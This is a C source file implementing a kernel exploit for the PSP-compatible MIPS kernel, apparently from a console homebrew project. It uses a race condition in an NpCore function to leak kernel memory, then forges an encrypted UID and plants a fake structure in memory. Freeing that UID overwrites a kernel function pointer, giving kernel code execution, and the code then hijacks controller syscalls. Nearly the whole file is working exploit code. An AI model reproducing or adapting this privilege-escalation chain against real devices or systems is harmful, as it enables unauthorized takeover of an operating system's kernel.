/* mips.c -- implementation of the mips kernel exploit
 *
 * Copyright (C) 2019 TheFloW
 *
 * This software may be modified and distributed under the terms
 * of the MIT license.  See the LICENSE file for details.
 */

#include <pspsdk.h>
#include <pspkernel.h>
#include <psputility.h>

#include <stdio.h>
#include <string.h>

#include "main.h"
#include "mips.h"
#include "rpc.h"

#define LIBC_CLOCK_OFFSET  0x88014d00
#define SYSMEM_SEED_OFFSET 0x88014e38
#define FAKE_UID_OFFSET    0x8814cfa8

int sceNpCore_8AFAB4A0(int *input, char *string, int length);

void (* _sceKernelIcacheInvalidateAll)(void);
void (* _sceKernelDcacheInvalidateRange)(const void *p, unsigned int size);
void (* _sceKernelDcacheWritebackInvalidateAll)(void);

int (* _sceMeRequest)(int cmd, ...);

int (* _sceKermitRequest)(KermitRequest *request, int mode, int cmd, int argc, int is_callback, u64 *resp);
int (* _sceKermitMemoryArgument)(KermitRequest *request, int arg, const void *data, int size, int mode);

SceModule3 *(*_sceKernelFindModuleByName)(const char *name);

static u32 find_function(const char *modname, const char *libname, u32 nid) {
  SceModule3 *mod = _sceKernelFindModuleByName(modname);
  if (!mod)
    return 0;

  int i = 0;
  while (i < mod->ent_size) {
    SceLibraryEntryTable *entry = (SceLibraryEntryTable *)(mod->ent_top + i);

    if (entry->libname && strcmp(entry->libname, libname) == 0) {
      u32 *table = entry->entrytable;
      int total = entry->stubcount + entry->vstubcount;

      int j;
      for (j = 0; j < total; j++) {
        if (table[j] == nid) {
          return table[j + total];
        }
      }
    }

    i += (entry->len * 4);
  }

  return 0;
}

static void repair_sysmem(void) {
  SceModule3 *mod = _sceKernelFindModuleByName("sceRTC_Service");
  _sw(mod->text_addr + 0x3904, LIBC_CLOCK_OFFSET);
  _sceKernelIcacheInvalidateAll();
  _sceKernelDcacheWritebackInvalidateAll(); 
}

static int kernel_function(void) {
  int k1 = pspSdkSetK1(0);
  int intc = pspSdkDisableInterrupts();

  // Find important function
  u32 i;
  for (i = 0x88000000; i < (0x88400000 - 0x54 - 4); i += 4) {
    if (_lw(i + 0x00) == 0x27BDFFE0 && _lw(i + 0x04) == 0xAFB40010 &&
        _lw(i + 0x08) == 0xAFB3000C && _lw(i + 0x0C) == 0xAFB20008 &&
        _lw(i + 0x10) == 0x00009021 && _lw(i + 0x14) == 0x02409821 &&
        _lw(i + 0x54) == 0x0263202A)
    {
      _sceKernelFindModuleByName = (void *)i;
      break;
    }
  }

  // Find functions
  _sceKernelIcacheInvalidateAll = (void *)find_function("sceSystemMemoryManager", "UtilsForKernel", 0x920F104A);
  _sceKernelDcacheInvalidateRange = (void *)find_function("sceSystemMemoryManager", "UtilsForKernel", 0xBFA98062);
  _sceKernelDcacheWritebackInvalidateAll = (void *)find_function("sceSystemMemoryManager", "UtilsForKernel", 0xB435DEC5);
  _sceMeRequest = (void *)find_function("sceMeCodecWrapper", "sceMeCore_driver", 0xFA398D71);
  _sceKermitRequest = (void *)find_function("sceKermit_Driver", "sceKermit_driver", 0x4F75AA05);
  if (!_sceKermitRequest)
    _sceKermitRequest = (void *)find_function("sceKermit_Driver", "sceKermit_driver", 0x36666181);
  _sceKermitMemoryArgument = (void *)find_function("sceLowIO_Driver", "sceKermitMemory_driver", 0xAAF047AC);

  // Repair sysmem
  repair_sysmem();

  // Install syscalls
  REDIRECT_FUNCTION(find_function("sceController_Service", "sceCtrl", 0x3A622550), _read_native);
  REDIRECT_FUNCTION(find_function("sceController_Service", "sceCtrl", 0xC152080A), _syscall);
  REDIRECT_FUNCTION(find_function("sceController_Service", "sceCtrl", 0x1F803938), _call);
  REDIRECT_FUNCTION(find_function("sceController_Service", "sceCtrl", 0x60B81F86), _init_rpc);
  _sceKernelIcacheInvalidateAll();
  _sceKernelDcacheWritebackInvalidateAll();

  pspSdkEnableInterrupts(intc);
  pspSdkSetK1(k1);
  return 0;
}

static volatile int running;
static volatile int idx;
static int input[3];

static int racer(SceSize args, void *argp) {
  running = 1;

  while (running) {
    input[1] = 0;
    sceKernelDelayThread(10);
    input[1] = idx;
    sceKernelDelayThread(10);
  }

  return sceKernelExitDeleteThread(0);
}

static u32 read_kernel_word(u32 addr) {
  SceUID thid = sceKernelCreateThread("", racer, 8, 0x1000, 0, NULL);
  if (thid < 0)
    return 0;

  sceKernelStartThread(thid, 0, NULL);

  char string[8];
  int round = 0;

  idx = -83; // relative offset 0xB00 in np_core.prx (0xD98 + (-83 << 3))

  int i;
  for (i = 0; i < 100000; i++) {
    u32 res = sceNpCore_8AFAB4A0(input, string, sizeof(string));
    if (res != 5 && res != 0x80550203) {
      switch (round) {
        case 0:
          round = 1;
          idx = (addr - (res - 0xA74) - 0xD98) >> 3;
          break;
        case 1:
          running = 0;
          return res;
      }
    }
  }

  running = 0;
  return 0;
}

int exploit_mips_kernel(void) {
  int res;

  sceUtilityLoadModule(PSP_MODULE_NP_COMMON);

  u32 seed = read_kernel_word(SYSMEM_SEED_OFFSET);
  if (!seed)
    return -1;

  sceUtilityUnloadModule(PSP_MODULE_NP_COMMON);

  sceUtilityLoadModule(PSP_MODULE_NET_COMMON);
  sceUtilityLoadModule(PSP_MODULE_NET_INET);

  SceUID uid = (((FAKE_UID_OFFSET & 0x00ffffff) >> 2) << 7) | 0x1;
  SceUID encrypted_uid = uid ^ seed;

  // Allocate dummy block to improve reliability
  char dummy[32];
  memset(dummy, 'a', sizeof(dummy));
  SceUID dummyid = sceKernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, dummy, PSP_SMEM_Low, 0x10, NULL);

  // Plant UID data structure into kernel as string
  u32 string[] = { LIBC_CLOCK_OFFSET - 4, 0x88888888, 0x88016dc0, encrypted_uid, 0x88888888, 0x10101010, 0, 0 };
  SceUID plantid = sceKernelAllocPartitionMemory(PSP_MEMORY_PARTITION_USER, (char *)&string, PSP_SMEM_Low, 0x10, NULL);

  sceKernelDcacheWritebackAll();

  // Overwrite function pointer at LIBC_CLOCK_OFFSET with 0x88888888
  res = sceKernelFreePartitionMemory(uid);

  sceKernelFreePartitionMemory(plantid);
  sceKernelFreePartitionMemory(dummyid);

  sceUtilityUnloadModule(PSP_MODULE_NET_INET);
  sceUtilityUnloadModule(PSP_MODULE_NET_COMMON);

  if (res < 0)
    return res;

  // Make a jump to kernel function
  REDIRECT_FUNCTION(0x08888888, kernel_function);
  sceKernelDcacheWritebackAll();

  // Execute kernel function
  return sceKernelLibcClock();
}
